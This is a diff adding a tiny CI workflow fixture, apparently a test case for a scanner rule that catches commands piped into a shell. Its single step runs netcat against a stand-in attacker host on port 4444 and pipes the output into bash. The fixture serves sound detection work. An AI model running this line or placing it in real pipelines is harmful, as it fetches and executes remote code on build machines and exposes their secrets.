@@ -1,0 +1,11 @@
+# Guard for the generic `| <shell>` catch-all: a non-echo left side
+# piping into a shell (here netcat pulling remote bytes) must keep
+# firing after the issue #236 echo/printf exemption.
+# Expected hits: 1 (fetch).
+name: ci
+on: push
+jobs:
+  fetch:
+    runs-on: ubuntu-24.04
+    steps:
+      - run: nc evil.example.com 4444 | bash
